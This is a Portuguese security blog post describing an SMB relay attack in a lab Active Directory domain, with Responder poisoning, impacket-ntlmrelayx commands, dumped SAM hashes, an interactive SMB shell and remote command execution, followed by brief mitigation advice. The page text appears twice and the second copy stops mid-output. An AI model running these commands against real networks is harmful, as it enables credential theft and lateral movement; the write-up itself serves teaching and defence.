<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SMB Relay Attack | {in}secure</title><meta name=keywords content="Active Directory,Poisoning & Spoofing,NTLMV2,MITM,SMB"><meta name=description content="Definição Em vez de capturarmos as hashes e tentarmos extrair a password podendo não existir sucesso devido à sua complexidade. Este ataque usa a hash capturada e encaminha para ganhar acesso noutra maquina, fazendo relay da hash. Em caso de sucesso este ataque é usado para movimentação lateral dentro de um dominio.
Cenário O cenário é constituido por duas workstations em que o utilizador José Cid é local administrator nas duas maquinas (WS01 e WS02)."><meta name=author content><link rel=canonical href=https://www.insecure.pt/posts/ad_smbrelay/><meta name=google-site-verification content="G-J560LHJW6W"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://www.insecure.pt/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.insecure.pt/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.insecure.pt/favicon-32x32.png><link rel=apple-touch-icon href=https://www.insecure.pt/apple-touch-icon.png><link rel=mask-icon href=https://www.insecure.pt/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-J560LHJW6W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-J560LHJW6W",{anonymize_ip:!1})}</script><meta property="og:title" content="SMB Relay Attack"><meta property="og:description" content="Definição Em vez de capturarmos as hashes e tentarmos extrair a password podendo não existir sucesso devido à sua complexidade. Este ataque usa a hash capturada e encaminha para ganhar acesso noutra maquina, fazendo relay da hash. Em caso de sucesso este ataque é usado para movimentação lateral dentro de um dominio.
Cenário O cenário é constituido por duas workstations em que o utilizador José Cid é local administrator nas duas maquinas (WS01 e WS02)."><meta property="og:type" content="article"><meta property="og:url" content="https://www.insecure.pt/posts/ad_smbrelay/"><meta property="og:image" content="https://www.insecure.pt/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="og:site_name" content="{in}secure"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.insecure.pt/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="SMB Relay Attack"><meta name=twitter:description content="Definição Em vez de capturarmos as hashes e tentarmos extrair a password podendo não existir sucesso devido à sua complexidade. Este ataque usa a hash capturada e encaminha para ganhar acesso noutra maquina, fazendo relay da hash. Em caso de sucesso este ataque é usado para movimentação lateral dentro de um dominio.
Cenário O cenário é constituido por duas workstations em que o utilizador José Cid é local administrator nas duas maquinas (WS01 e WS02)."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://www.insecure.pt/posts/"},{"@type":"ListItem","position":2,"name":"SMB Relay Attack","item":"https://www.insecure.pt/posts/ad_smbrelay/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SMB Relay Attack","name":"SMB Relay Attack","description":"Definição Em vez de capturarmos as hashes e tentarmos extrair a password podendo não existir sucesso devido à sua complexidade. Este ataque usa a hash capturada e encaminha para ganhar acesso noutra maquina, fazendo relay da hash. Em caso de sucesso este ataque é usado para movimentação lateral dentro de um dominio.\nCenário O cenário é constituido por duas workstations em que o utilizador José Cid é local administrator nas duas maquinas (WS01 e WS02).","keywords":["Active Directory","Poisoning \u0026 Spoofing","NTLMV2","MITM","SMB"],"articleBody":"Definição Em vez de capturarmos as hashes e tentarmos extrair a password podendo não existir sucesso devido à sua complexidade. Este ataque usa a hash capturada e encaminha para ganhar acesso noutra maquina, fazendo relay da hash. Em caso de sucesso este ataque é usado para movimentação lateral dentro de um dominio.\nCenário O cenário é constituido por duas workstations em que o utilizador José Cid é local administrator nas duas maquinas (WS01 e WS02). O SMB Signing encontra-se desabilitado.\nRequisitos Para que este ataque seja possivel, o ambiente tem de ter os seguintes requisitos:\nSMB Signing disabled; O utilizador tem de ser administrator local das maquinas envolvidas. Enumeração SMB Signing Disabled O primeiro passo é verificar se o SMB Signing está inactivo e para isso usaremos o nmap com o comando abaixo:\nnmap -Pn --script=smb2-security-mode.nse -p 445 ou\nnmap -Pn --script=smb2-security-mode.nse -p 445 / Podemos verificar que está activo mas não é obrigatório o seu uso, desta forma é vulnerável.\nExploração (PoC) Configuração do responder Como o objectivo é reenviar a hash que iremos receber para outra workstation iremos configurar o responder . Teremos que desabilitar\nsudo vi /etc/responder/Responder.conf sudo responder -I eth0 -wdv De seguida iremos utilizar uma ferramenta da impacket para fazer relay da hash para a outra máquina com o objectivo de ganharmos acesso sobre a mesma, para que isso seja possivel o utilizador terá de ser local administrator da maquina que iremos tentar comprometer.\nimpacket-ntlmrelayx -t 192.168.0.102 -smb2support\n┌──(kali㉿insecure)-[~] └─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Protocol Client LDAPS loaded.. [*] Protocol Client LDAP loaded.. [*] Protocol Client MSSQL loaded.. [*] Protocol Client DCSYNC loaded.. [*] Protocol Client RPC loaded.. [*] Protocol Client HTTP loaded.. [*] Protocol Client HTTPS loaded.. [*] Protocol Client SMB loaded.. [*] Protocol Client IMAPS loaded.. [*] Protocol Client IMAP loaded.. [*] Protocol Client SMTP loaded.. [*] Running in relay mode to single host [*] Setting up SMB Server [*] Setting up HTTP Server on port 80 [*] Setting up WCF Server [*] Setting up RAW Server on port 6666 [*] Servers started, waiting for connections Iniciamos o ataque atraves de LLMNR\n*] [DHCP] Found DHCP server IP: 192.168.0.22, now waiting for incoming requests...\r[*] [MDNS] Poisoned answer sent to 192.168.0.101 for name WS01.local\r[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local\r[*] [LLMNR] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01\r[*] [LLMNR] Poisoned answer sent to 192.168.0.101 for name WS01\r[*] [MDNS] Poisoned answer sent to 192.168.0.101 for name WS01.local\r[*] [LLMNR] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01\r[*] [LLMNR] Poisoned answer sent to 192.168.0.101 for name WS01\r[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local\r[*] [MDNS] Poisoned answer sent to 192.168.0.101 for name WS01.local\r[*] [LLMNR] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01\r[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local\r[*] [LLMNR] Poisoned answer sent to 192.168.0.101 for name WS01\r[*] [MDNS] Poisoned answer sent to 192.168.0.101 for name WS01.local\r[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local\r[*] [LLMNR] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01\r[*] [LLMNR] Poisoned answer sent to 192.168.0.101 for name WS01\r[*] [MDNS] Poisoned answer sent to 192.168.0.102 for name WS02.local\r[*] [MDNS] Poisoned answer sent to fe80::3066:d170:a156:1320 for name WS02.local\r[*] [LLMNR] Poisoned answer sent to fe80::3066:d170:a156:1320 for name WS02\r[*] [LLMNR] Poisoned answer sent to 192.168.0.102 for name WS02\r[*] [MDNS] Poisoned answer sent to 192.168.0.102 for name WS02.local\r[*] [MDNS] Poisoned answer sent to fe80::3066:d170:a156:1320 for name WS02.local E temos agora à disposição as hashes dos utilizadores locais da maquina de destino, que poderemos utilizar para lateral movement.\n┌──(kali㉿insecure)-[~]\r└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support\rImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\r[*] Protocol Client LDAPS loaded..\r[*] Protocol Client LDAP loaded..\r[*] Protocol Client MSSQL loaded..\r[*] Protocol Client DCSYNC loaded..\r[*] Protocol Client RPC loaded..\r[*] Protocol Client HTTP loaded..\r[*] Protocol Client HTTPS loaded..\r[*] Protocol Client SMB loaded..\r[*] Protocol Client IMAPS loaded..\r[*] Protocol Client IMAP loaded..\r[*] Protocol Client SMTP loaded..\r[*] Running in relay mode to single host\r[*] Setting up SMB Server\r[*] Setting up HTTP Server on port 80\r[*] Setting up WCF Server\r[*] Setting up RAW Server on port 6666\r[*] Servers started, waiting for connections\r[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.0.101, attacking target smb://192.168.0.102\r[*] Authenticating against smb://192.168.0.102 as INSECURE/JCID SUCCEED\r[*] Service RemoteRegistry is in stopped state\r[*] Service RemoteRegistry is disabled, enabling it\r[*] Starting service RemoteRegistry\r[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!\r[*] Target system bootKey: 0xdef8c5bdb9e10578190e9f3751969b65\r[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9ebbbaa98c9ab926aae0a26b1a7945ca:::\rtest:1003:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\r[*] Done dumping SAM hashes for host: 192.168.0.102\r[*] Stopping service RemoteRegistry\r[*] Restoring the disabled state for service RemoteRegistry\r[*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left! Shell Interactiva Com a opção -i (interactive) a ferramenta cria uma reverse shell que poderemos aceder atraves da nossa maquina.\n** [*] Started interactive SMB client shell via TCP on 127.0.0.1:11000 **\n┌──(kali㉿insecure)-[~]\r└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support -i\rImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\r[*] Protocol Client LDAP loaded..\r[*] Protocol Client LDAPS loaded..\r[*] Protocol Client MSSQL loaded..\r[*] Protocol Client DCSYNC loaded..\r[*] Protocol Client RPC loaded..\r[*] Protocol Client HTTP loaded..\r[*] Protocol Client HTTPS loaded..\r[*] Protocol Client SMB loaded..\r[*] Protocol Client IMAP loaded..\r[*] Protocol Client IMAPS loaded..\r[*] Protocol Client SMTP loaded..\r[*] Running in relay mode to single host\r[*] Setting up SMB Server\r[*] Setting up HTTP Server on port 80\r[*] Setting up WCF Server\r[*] Setting up RAW Server on port 6666\r[*] Servers started, waiting for connections\r[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.0.101, attacking target smb://192.168.0.102\r[*] Authenticating against smb://192.168.0.102 as INSECURE/JCID SUCCEED\r[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000\r[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!\r[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left! Para tal basta abrir uma sessão com netcat para o IP/Porto que a nossa sessão está estabecida.\n┌──(kali㉿insecure)-[~]\r└─$ nc -nv 127.0.0.1 11000\r(UNKNOWN) [127.0.0.1] 11000 (?) open\rType help for list of commands\r# ?\ropen {host,port=445} - opens a SMB connection against the target host/port\rlogin {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted\rkerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name\rlogin_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes\rlogoff - logs off\rshares - list available shares\ruse {sharename} - connect to an specific share\rcd {path} - changes the current directory to {path}\rlcd {path} - changes the current local directory to {path}\rpwd - shows current remote directory\rpassword - changes the user password, the new password will be prompted for input\rls {wildcard} - lists all the files in the current directory\rrm {file} - removes the selected file\rmkdir {dirname} - creates the directory under the current path\rrmdir {dirname} - removes the directory under the current path\rput {filename} - uploads the filename into the current path\rget {filename} - downloads the filename from the current path\rmget {mask} - downloads all files from the current directory matching the provided mask\rcat {filename} - reads the filename from the current path\rmount {target,path} - creates a mount point from {path} to {target} (admin required)\rumount {path} - removes the mount point at {path} without deleting the directory (admin required)\rlist_snapshots {path} - lists the vss snapshots for the specified path\rinfo - returns NetrServerInfo main results\rwho - returns the sessions currently connected at the target host (admin required)\rclose - closes the current SMB Session\rexit - terminates the server process (and this session) É possivel ainda enviar commandos, o exemplo abaixo mostra o output mas na prática até nos possivel enviar oneliners para criação de uma reverse shell.\n└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support -c \"whoami /priv\"\rImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\r[*] Protocol Client LDAP loaded..\r[*] Protocol Client LDAPS loaded..\r[*] Protocol Client MSSQL loaded..\r[*] Protocol Client DCSYNC loaded..\r[*] Protocol Client RPC loaded..\r[*] Protocol Client HTTPS loaded..\r[*] Protocol Client HTTP loaded..\r[*] Protocol Client SMB loaded..\r[*] Protocol Client IMAPS loaded..\r[*] Protocol Client IMAP loaded..\r[*] Protocol Client SMTP loaded..\r[*] Running in relay mode to single host\r[*] Setting up SMB Server\r[*] Setting up HTTP Server on port 80\r[*] Setting up WCF Server\r[*] Setting up RAW Server on port 6666\r[*] Servers started, waiting for connections\r[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.0.101, attacking target smb://192.168.0.102\r[*] Authenticating against smb://192.168.0.102 as INSECURE/JCID SUCCEED\r[*] Service RemoteRegistry is in stopped state\r[*] Service RemoteRegistry is disabled, enabling it\r[*] Starting service RemoteRegistry\r[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!\r[*] Executed specified command on host: 192.168.0.102\rPRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State\r========================================= ================================================================== ========\rSeAssignPrimaryTokenPrivilege Replace a process level token Disabled\rSeLockMemoryPrivilege Lock pages in memory Enabled\rSeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled\rSeTcbPrivilege Act as part of the operating system Enabled\rSeSecurityPrivilege Manage auditing and security log Disabled\rSeTakeOwnershipPrivilege Take ownership of files or other objects Disabled\rSeLoadDriverPrivilege Load and unload device drivers Disabled\rSeSystemProfilePrivilege Profile system performance Enabled\rSeSystemtimePrivilege Change the system time Disabled\rSeProfileSingleProcessPrivilege Profile single process Enabled\rSeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled\rSeCreatePagefilePrivilege Create a pagefile Enabled\rSeCreatePermanentPrivilege Create permanent shared objects Enabled\rSeBackupPrivilege Back up files and directories Disabled\rSeRestorePrivilege Restore files and directories Disabled\rSeShutdownPrivilege Shut down the system Disabled\rSeDebugPrivilege Debug programs Enabled\rSeAuditPrivilege Generate security audits Enabled\rSeSystemEnvironmentPrivilege Modify firmware environment values Disabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled\rSeUndockPrivilege Remove computer from docking station Disabled\rSeManageVolumePrivilege Perform volume maintenance tasks Disabled\rSeImpersonatePrivilege Impersonate a client after authentication Enabled\rSeCreateGlobalPrivilege Create global objects Enabled\rSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\rSeTimeZonePrivilege Change the time zone Enabled\rSeCreateSymbolicLinkPrivilege Create symbolic links Enabled\rSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled\r[*] Stopping service RemoteRegistry\r[*] Restoring the disabled state for service RemoteRegistry\r[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left! Mitigação Habititar SMB Signing como obrigatório. Pode ser feito por GPO para toda a organização, devemos ter em conta que esta configuração poderá criar latência em cerca de 50% na transferência de ficheiros.\nhttps://www.rootusers.com/configure-smb-signing-via-group-policy/\nAccount Tiering Garantir que os utilizadors dependendo da seu nivel de acesso só acedem a servidores especificos e não permitir que os utilizadores sejam local admins das suas máquinas.\n","wordCount":"1800","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.insecure.pt/posts/ad_smbrelay/"},"publisher":{"@type":"Organization","name":"{in}secure","logo":{"@type":"ImageObject","url":"https://www.insecure.pt/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.insecure.pt/ accesskey=h title="{in}secure (Alt + H)">{in}secure</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://www.insecure.pt/posts/ title=Artigos><span>Artigos</span></a></li><li><a href=https://www.insecure.pt/tags/ title=Etiquetas><span>Etiquetas</span></a></li><li><a href=https://www.insecure.pt/search/ title="Procurar (Alt + /)" accesskey=/><span>Procurar</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://www.insecure.pt/>Home</a>&nbsp;»&nbsp;<a href=https://www.insecure.pt/posts/>Posts</a></div><h1 class=post-title>SMB Relay Attack</h1><div class=post-meta>9 min&nbsp;·&nbsp;1800 words</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#definição>Definição</a></li><li><a href=#cenário>Cenário</a><ul><li><a href=#requisitos>Requisitos</a></li></ul></li><li><a href=#enumeração>Enumeração</a><ul><li><a href=#smb-signing-disabled>SMB Signing Disabled</a></li></ul></li><li><a href=#exploração-poc>Exploração (PoC)</a><ul><li><a href=#configuração-do-_responder_>Configuração do <em>responder</em></a></li><li><a href=#_shell_-interactiva><em>Shell</em> Interactiva</a></li></ul></li></ul><ul><li><a href=#habititar-smb-signing-como-obrigatório>Habititar SMB Signing como obrigatório.</a></li><li><a href=#account-_tiering_>Account <em>Tiering</em></a></li></ul></nav></div></details></div><div class=post-content><h2 id=definição>Definição<a hidden class=anchor aria-hidden=true href=#definição>#</a></h2><p>Em vez de capturarmos as <em>hashes</em> e tentarmos extrair a password podendo não existir sucesso devido à sua complexidade.
Este ataque usa a <em>hash</em> capturada e encaminha para ganhar acesso noutra maquina, fazendo <em>relay</em> da <em>hash</em>.
Em caso de sucesso este ataque é usado para movimentação lateral dentro de um dominio.</p><h2 id=cenário>Cenário<a hidden class=anchor aria-hidden=true href=#cenário>#</a></h2><p>O cenário é constituido por duas <em>workstations</em> em que o utilizador José Cid é <em>local administrator</em> nas duas maquinas (WS01 e WS02).
O <em>SMB Signing</em> encontra-se desabilitado.</p><p><img loading=lazy src=CenarioSMBRelay.jpg#center alt></p><h3 id=requisitos>Requisitos<a hidden class=anchor aria-hidden=true href=#requisitos>#</a></h3><p>Para que este ataque seja possivel, o ambiente tem de ter os seguintes requisitos:</p><ul><li><em>SMB Signing</em> <em>disabled</em>;</li><li>O utilizador tem de ser administrator local das maquinas envolvidas.</li></ul><h2 id=enumeração>Enumeração<a hidden class=anchor aria-hidden=true href=#enumeração>#</a></h2><h3 id=smb-signing-disabled>SMB Signing Disabled<a hidden class=anchor aria-hidden=true href=#smb-signing-disabled>#</a></h3><p>O primeiro passo é verificar se o <em>SMB Signing</em> está inactivo e para isso usaremos o nmap com o comando abaixo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nmap -Pn --script<span class=o>=</span>smb2-security-mode.nse -p <span class=m>445</span> &lt;IP&gt;
</span></span></code></pre></div><p>ou</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nmap -Pn --script<span class=o>=</span>smb2-security-mode.nse -p <span class=m>445</span> &lt;IP&gt;/&lt;CIDR&gt;
</span></span></code></pre></div><p>Podemos verificar que está activo mas não é obrigatório o seu uso, desta forma é vulnerável.</p><p><img loading=lazy src=smbrecon.png#center alt></p><h2 id=exploração-poc>Exploração (PoC)<a hidden class=anchor aria-hidden=true href=#exploração-poc>#</a></h2><h3 id=configuração-do-_responder_>Configuração do <em>responder</em><a hidden class=anchor aria-hidden=true href=#configuração-do-_responder_>#</a></h3><p>Como o objectivo é reenviar a <em>hash</em> que iremos receber para outra workstation iremos configurar o <em>responder</em> .
Teremos que desabilitar</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo vi /etc/responder/Responder.conf
</span></span></code></pre></div><p><img loading=lazy src=smbrelayresponderconfig.png alt></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo responder -I eth0 -wdv
</span></span></code></pre></div><p><img loading=lazy src=smbrelayresponderrunning.png alt></p><p>De seguida iremos utilizar uma ferramenta da <em>impacket</em> para fazer relay da <em>hash</em> para a outra máquina com o objectivo de ganharmos acesso sobre a mesma, para que isso seja possivel o utilizador terá de ser <em>local administrator</em> da maquina que iremos tentar comprometer.</p><p>impacket-ntlmrelayx -t 192.168.0.102 -smb2support</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿insecure<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support
</span></span><span class=line><span class=cl>Impacket v0.10.0 - Copyright <span class=m>2022</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client LDAPS loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client LDAP loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client MSSQL loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client DCSYNC loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client RPC loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client HTTP loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client HTTPS loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client SMB loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client IMAPS loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client IMAP loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Protocol Client SMTP loaded..
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Running in relay mode to single host
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Setting up SMB Server
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Setting up HTTP Server on port <span class=m>80</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Setting up WCF Server
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Setting up RAW Server on port <span class=m>6666</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Servers started, waiting <span class=k>for</span> connections
</span></span></code></pre></div><p>Iniciamos o ataque atraves de <strong><a href=/posts/ad_llmnr/#explora%C3%A7%C3%A3o-poc>LLMNR</a></strong></p><p><img loading=lazy src=LLMNRStart.png alt></p><pre tabindex=0><code>
*] [DHCP] Found DHCP server IP: 192.168.0.22, now waiting for incoming requests...
[*] [MDNS] Poisoned answer sent to 192.168.0.101   for name WS01.local
[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local
[*] [LLMNR]  Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01
[*] [LLMNR]  Poisoned answer sent to 192.168.0.101 for name WS01
[*] [MDNS] Poisoned answer sent to 192.168.0.101   for name WS01.local
[*] [LLMNR]  Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01
[*] [LLMNR]  Poisoned answer sent to 192.168.0.101 for name WS01
[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local
[*] [MDNS] Poisoned answer sent to 192.168.0.101   for name WS01.local
[*] [LLMNR]  Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01
[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local
[*] [LLMNR]  Poisoned answer sent to 192.168.0.101 for name WS01
[*] [MDNS] Poisoned answer sent to 192.168.0.101   for name WS01.local
[*] [MDNS] Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01.local
[*] [LLMNR]  Poisoned answer sent to fe80::a88c:9816:a018:8bef for name WS01
[*] [LLMNR]  Poisoned answer sent to 192.168.0.101 for name WS01
[*] [MDNS] Poisoned answer sent to 192.168.0.102   for name WS02.local
[*] [MDNS] Poisoned answer sent to fe80::3066:d170:a156:1320 for name WS02.local
[*] [LLMNR]  Poisoned answer sent to fe80::3066:d170:a156:1320 for name WS02
[*] [LLMNR]  Poisoned answer sent to 192.168.0.102 for name WS02
[*] [MDNS] Poisoned answer sent to 192.168.0.102   for name WS02.local
[*] [MDNS] Poisoned answer sent to fe80::3066:d170:a156:1320 for name WS02.local
</code></pre><p>E temos agora à disposição as <em>hashes</em> dos utilizadores locais da maquina de destino, que poderemos utilizar para <em>lateral movement</em>.</p><pre tabindex=0><code>
┌──(kali㉿insecure)-[~]
└─$ impacket-ntlmrelayx -t 192.168.0.102 -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.0.101, attacking target smb://192.168.0.102
[*] Authenticating against smb://192.168.0.102 as INSECURE/JCID SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.0.101 controlled, but there are no more targets left!
[*] Target system bootKey: 0xdef8c5bdb9e10578190e9f3751969b65
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
